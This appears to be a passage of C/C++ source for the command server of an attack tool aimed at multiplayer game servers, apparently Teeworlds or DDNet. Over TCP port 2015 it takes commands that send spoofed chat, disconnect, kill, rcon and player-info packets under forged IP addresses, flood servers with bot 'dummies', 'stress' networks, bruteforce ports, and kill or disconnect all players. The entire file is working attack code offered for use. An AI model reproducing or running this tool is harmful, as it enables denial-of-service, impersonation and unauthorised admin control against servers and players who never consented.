					send(g_Client, "[Server]: Please use: votebot <ip> <port> <num> <vote>", strlen("[Server]: Please use: votebot <ip> <port> <num> <vote>"), 0);
			}
			else if(strcmp(aCmd[0], "rconban") == 0)
			{
				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
				{
					int Port = atoi(aCmd[2]);
					RconBan(aCmd[1], Port, aCmd[3]);

					send(g_Client, "[Server]: Dummy for banning sent successfully!", strlen("[Server]: Dummy for banning sent successfully!"), 0);
				}
				else
					send(g_Client, "[Server]: Please use: rconban <srvip> <srvport> <banip>", strlen("[Server]: Please use: rconban <srvip> <srvport> <banip>"), 0);
			}
			else if(strcmp(aCmd[0], "ipspam") == 0)
			{
				if(aCmd[1][0] && aCmd[2][0])
				{
					send(g_Client, "[Server]: IP-spam sent successfully!", strlen("[Server]: IP-spam sent successfully!"), 0);
					int Port = atoi(aCmd[2]);
					SpamIPs(aCmd[1], Port);
				}
				else
					send(g_Client, "[Server]: Please use: ipspam <srvip> <srvport>", strlen("[Server]: Please use: ipspam <srvip> <srvport>"), 0);
			}
			else if(strcmp(aCmd[0], "chat") == 0)
			{
				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0] && aCmd[5][0])
				{
					int SrvPort = atoi(aCmd[2]);
					int Port = atoi(aCmd[4]);

					char aMsg[256];
					ZeroMemory(&aMsg, sizeof(aMsg));
					for(int i = 5; i <= Cmd; i++)
					{
						char aBuf[128];
						str_format(aBuf, sizeof(aBuf), "%s ", aCmd[i]);
						str_append(aMsg, aBuf, sizeof(aMsg));
					}

					SendChat(aCmd[1], SrvPort, aCmd[3], Port, aMsg);

					send(g_Client, "[Server]: Spoofed chat message sent successfully!", strlen("[Server]: Spoofed chat message sent successfully!"), 0);
				}
				else
					send(g_Client, "[Server]: Please use: chat <srvip> <srvport> <spoofip> <spoofport> <message>", strlen("[Server]: Please use: chat <srvip> <srvport> <spoofip> <spoofport> <message>"), 0);
			}
			else if(strcmp(aCmd[0], "disconnect") == 0)
			{
				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0])
				{
					int SrvPort = atoi(aCmd[2]);
					int Port = atoi(aCmd[4]);

					SendDisconnect(aCmd[1], SrvPort, aCmd[3], Port);

					send(g_Client, "[Server]: Spoofed disconnect sent successfully!", strlen("[Server]: Spoofed disconnect sent successfully!"), 0);
				}
				else
					send(g_Client, "[Server]: Please use: disconnect <srvip> <srvport> <spoofip> <spoofport>", strlen("[Server]: Please use: disconnect <srvip> <srvport> <spoofip> <spoofport>"), 0);
			}
			else if(strcmp(aCmd[0], "ipdetails") == 0)
			{
				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0])
				{
					int SrvPort = atoi(aCmd[2]);
					int Port = atoi(aCmd[4]);

					SendIPDetails(aCmd[1], SrvPort, aCmd[3], Port);

					send(g_Client, "[Server]: Spoofed ipdetails sent successfully!", strlen("[Server]: Spoofed ipdetails sent successfully!"), 0);
				}
				else
					send(g_Client, "[Server]: Please use: ipdetails <srvip> <srvport> <spoofip> <spoofport>", strlen("[Server]: Please use: ipdetails <srvip> <srvport> <spoofip> <spoofport>"), 0);
			}
			else if(strcmp(aCmd[0], "rcon") == 0)
			{
				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0] && aCmd[5][0])
				{
					int SrvPort = atoi(aCmd[2]);
					int Port = atoi(aCmd[4]);

					SendRcon(aCmd[1], SrvPort, aCmd[3], Port, aCmd[5]);

					send(g_Client, "[Server]: Spoofed rcon sent successfully!", strlen("[Server]: Spoofed rcon sent successfully!"), 0);
				}
				else
					send(g_Client, "[Server]: Please use: rcon <srvip> <srvport> <spoofip> <spoofport> <cmd>", strlen("[Server]: Please use: rcon <srvip> <srvport> <spoofip> <spoofport> <cmd>"), 0);
			}
			else if(strcmp(aCmd[0], "kill") == 0)
			{
				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0])
				{
					int SrvPort = atoi(aCmd[2]);
					int Port = atoi(aCmd[4]);

					SendKill(aCmd[1], SrvPort, aCmd[3], Port);

					send(g_Client, "[Server]: Spoofed kill sent successfully!", strlen("[Server]: Spoofed kill sent successfully!"), 0);
				}
				else
					send(g_Client, "[Server]: Please use: kill <srvip> <srvport> <spoofip> <spoofport>", strlen("[Server]: Please use: kill <srvip> <srvport> <spoofip> <spoofport>"), 0);
			}
			else if(strcmp(aCmd[0], "stressing") == 0)
			{
				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
				{
					int SrvPort = atoi(aCmd[2]);

					SendStressingNetwork(aCmd[1], SrvPort, aCmd[3]);

					send(g_Client, "[Server]: Stressing network sent successfully!", strlen("[Server]: Stressing network sent successfully!"), 0);
				}
				else
					send(g_Client, "[Server]: Please use: stressing <srvip> <srvport> <spoofip>", strlen("[Server]: Please use: stressing <srvip> <srvport> <spoofip>"), 0);
			}
			else if(strcmp(aCmd[0], "bruteport") == 0)
			{
				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
				{
					int Port = atoi(aCmd[2]);
					BruteforcePort(aCmd[1], Port, aCmd[3]);

					send(g_Client, "[Server]: Port bruteforcing in progress! (Might take up to a minute)", strlen("[Server]: Port bruteforcing in progress! (Might take up to a minute)"), 0);
				}
				else
					send(g_Client, "[Server]: Please use: bruteport <srvip> <srvport> <spoofip>", strlen("[Server]: Please use: bruteport <srvip> <srvport> <spoofip>"), 0);
			}
			else if (strcmp(aCmd[0], "changeinfo") == 0)
			{
				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0] && aCmd[5][0] && aCmd[7][0] && aCmd[8][0] && aCmd[9][0] && aCmd[10][0])
				{
					int SrvPort = atoi(aCmd[2]);
					int Port = atoi(aCmd[4]);

					SendChangeInfo(aCmd[1], SrvPort, aCmd[3], Port, aCmd[5], aCmd[6], atoi(aCmd[7]), aCmd[7], atoi(aCmd[8]), atoi(aCmd[9]), atoi(aCmd[10]));

					send(g_Client, "[Server]: Spoofed change info sent successfully!", strlen("[Server]: Spoofed change info sent successfully!"), 0);
				}
				else
					send(g_Client, "[Server]: Please use: changeinfo <srvip> <srvport> <spoofip> <spoofport> <name> <clan = ""> <country = -1> <skin = default> <usecustomcolor = 0> <colorbody = 65408> <colorfeet = 65408>", strlen("[Server]: Please use: changeinfo <srvip> <srvport> <spoofip> <spoofport> <name> <clan> <country> <skin = default> <usecustomcolor = 0> <colorbody = 65408> <colorfeet = 65408>"), 0);
			}
			else if(strcmp(aCmd[0], "killall") == 0)
			{
				if(aCmd[1][0] && aCmd[2][0])
				{
					int Port = atoi(aCmd[2]);
					KillAll(aCmd[1], Port);

					send(g_Client, "[Server]: All players were killed!", strlen("[Server]: All players were killed!"), 0);
				}
				else
					send(g_Client, "[Server]: Please use: killall <srvip> <srvport>", strlen("[Server]: Please use: killall <srvip> <srvport>"), 0);
			}
			else if(strcmp(aCmd[0], "dcall") == 0)
			{
				if(aCmd[1][0] && aCmd[2][0])
				{
					int Port = atoi(aCmd[2]);
					DCAll(aCmd[1], Port);

					send(g_Client, "[Server]: All players were disconnected!", strlen("[Server]: All players were disconnected!"), 0);
				}
				else
					send(g_Client, "[Server]: Please use: dcall <srvip> <srvport>", strlen("[Server]: Please use: dcall <srvip> <srvport>"), 0);
			}
			else if(strcmp(aCmd[0], "chatall") == 0)
			{
				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
				{
					int Port = atoi(aCmd[2]);
					char aMsg[256];
					ZeroMemory(&aMsg, sizeof(aMsg));
					for(int i = 3; i <= Cmd; i++)
					{
						char aBuf[128];
						str_format(aBuf, sizeof(aBuf), "%s ", aCmd[i]);
						str_append(aMsg, aBuf, sizeof(aMsg));
					}

					ChatAll(aCmd[1], Port, aMsg);

					send(g_Client, "[Server]: Chatmessage was sent from all players!", strlen("[Server]: Chatmessage was sent from all players!"), 0);
				}
				else
					send(g_Client, "[Server]: Please use: chatall <srvip> <srvport> <msg>", strlen("[Server]: Please use: chatall <srvip> <srvport> <msg>"), 0);
			}
			else if (strcmp(aCmd[0], "chatdummies") == 0)
			{
				if (aCmd[1][0])
				{
					if (AmountofDummies > 0)
					{
						char aMsg[256];
						ZeroMemory(&aMsg, sizeof(aMsg));
						for (int i = 1; i <= Cmd; i++)
						{
							char aBuf[128];
							str_format(aBuf, sizeof(aBuf), "%s ", aCmd[i]);
							str_append(aMsg, aBuf, sizeof(aMsg));
						}

						ChatDummies(aMsg);
						send(g_Client, "[Server]: Chatmessage was sent from all dummies!", strlen("[Server]: Chatmessage was sent from all dummies!"), 0);
					}
					else
					{
						send(g_Client, "[Server]: Connect at least one dummy!", strlen("[Server]: Connect at least one dummy!"), 0);
					}
				}
				else
					send(g_Client, "[Server]: Please use: chatdummies <msg>", strlen("[Server]: Please use: chatdummies <msg>"), 0);
			}
			else if(strcmp(aCmd[0], "register") == 0)
			{
				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
				{
					int Port = atoi(aCmd[2]);
					int Num = atoi(aCmd[3]);
					if(Num > 0 && Num <= 64)
					{
						if(RegisterSpam)
						{
							RegisterSpam = false;
							RegisterPort = 0;
							ZeroMemory(&RegisterAddr, sizeof(RegisterAddr));
							RegisterNum = 0;
							DisconnectDummies();
							send(g_Client, "[Server]: Stopped RegisterSpam!", strlen("[Server]: Stopped RegisterSpam!"), 0);
						}
						else
						{
							FloodActive = false;
							ConnectDummies(aCmd[1], Port, Num, 0);
							RegisterSpam = true;
							RegisterPort = Port;
							str_format(RegisterAddr, sizeof(RegisterAddr), "%s", aCmd[1]);
							RegisterNum = Num;
							send(g_Client, "[Server]: Started RegisterSpam!", strlen("[Server]: Started RegisterSpam!"), 0);
						}
					}
					else
						send(g_Client, "[Server]: Please select a amount between 1 and 64!", strlen("[Server]: Please select a amount between 1 and 64!"), 0);
				}
				else
					send(g_Client, "[Server]: Please use: register <ip> <port> <num>", strlen("[Server]: Please use: register <ip> <port> <num>"), 0);
			}
			else if(strcmp(aCmd[0], "flood") == 0)
			{
				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
				{
					int Port = atoi(aCmd[2]);
					int Num = atoi(aCmd[3]);
					if(Num > 0 && Num <= 64)
					{
						if(FloodActive)
						{
							FloodActive = false;
							RegisterPort = 0;
							ZeroMemory(&RegisterAddr, sizeof(RegisterAddr));
							ZeroMemory(&FloodMsg, sizeof(FloodMsg));
							RegisterNum = 0;
							DisconnectDummies();
							send(g_Client, "[Server]: Stopped Flood!", strlen("[Server]: Stopped Flood!"), 0);
						}
						else
						{
							RegisterSpam = false;
							ConnectDummies(aCmd[1], Port, Num, 0);
							FloodActive = true;
							RegisterPort = Port;
							str_format(RegisterAddr, sizeof(RegisterAddr), "%s", aCmd[1]);
							RegisterNum = Num;

							char aMsg[256];
							ZeroMemory(&aMsg, sizeof(aMsg));
							for (int i = 4; i <= Cmd; i++)
							{
								char aBuf[128];
								str_format(aBuf, sizeof(aBuf), "%s ", aCmd[i]);
								str_append(aMsg, aBuf, sizeof(aMsg));
							}

							str_format(FloodMsg, sizeof(FloodMsg), "%s",aMsg);

							send(g_Client, "[Server]: Started Flood!", strlen("[Server]: Started Flood!"), 0);
						}
					}
					else
						send(g_Client, "[Server]: Please select a amount between 1 and 64!", strlen("[Server]: Please select a amount between 1 and 64!"), 0);
				}
				else
					send(g_Client, "[Server]: Please use: flood <ip> <port> <num> <optional: chat msg>", strlen("[Server]: Please use: flood <ip> <port> <num> <optional: chat msg>"), 0);
			}
			else if (strcmp(aCmd[0], "fetchips") == 0)
			{
				exec("fetchips.py");
				exec("fixips.exe");
				send(g_Client, "[Server]: Fetching ips ... done", strlen("[Server]: Fetching ips ... done"), 0);
			}
			else if (strcmp(aCmd[0], "exit") == 0)
			{
				send(g_Client, "[Server]: Closing thread...", strlen("[Server]: Closing thread..."), 0);
				printf("Closed thread");
				return 0;
			}
			else
				send(g_Client, "[Server]: Unknown command.", strlen("[Server]: Unknown command."), 0);
		}
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	DWORD Thread;
	WSADATA data;
	SOCKET g_Server, g_Client;
	SOCKADDR_IN info, client_info;
	int client_info_length = sizeof(client_info);

	printf("Starting...\n");

	// WSA
	if (WSAStartup(MAKEWORD(2, 0), &data) != 0)
		printf("Error in WSAStartup(): %s\n", WSAGetLastError());

	// Socket
	g_Server = socket(AF_INET, SOCK_STREAM, 0);
	if (g_Server == INVALID_SOCKET)
		printf("Error in socket(): %s\n", WSAGetLastError());

	// Set socket in non blocking mode
	u_long iMode = 1;
	ioctlsocket(g_Server, FIONBIO, &iMode);

	// Info
	info.sin_addr.s_addr = INADDR_ANY;
		info.sin_family = AF_INET;
	info.sin_port = htons(2015);

	// Bind
	if (bind(g_Server, (struct sockaddr*)&info, sizeof(info)) == SOCKET_ERROR)
		printf("Error in bind(): %s\n", WSAGetLastError());

	// Listen
	if (listen(g_Server, 5) == SOCKET_ERROR)
		printf("Error in listen(): %s\n", WSAGetLastError());

	printf("Waiting for clients...\n");

	while (1) //used for updating
	{
		Tick();

		g_Client = accept(g_Server, (struct sockaddr*)&client_info, &client_info_length);

		if (g_Client != SOCKET_ERROR)
		{
			printf("Client accepted: %s:%i\n", inet_ntoa(client_info.sin_addr), ntohs(client_info.sin_port));
			// create a thread for multi-client support!
			CreateThread(NULL, 0, WorkingThread, (LPVOID)g_Client, 0, &Thread);
		}

		Sleep(1);
	}

	closesocket(g_Server);
	WSACleanup();
	return 0;
}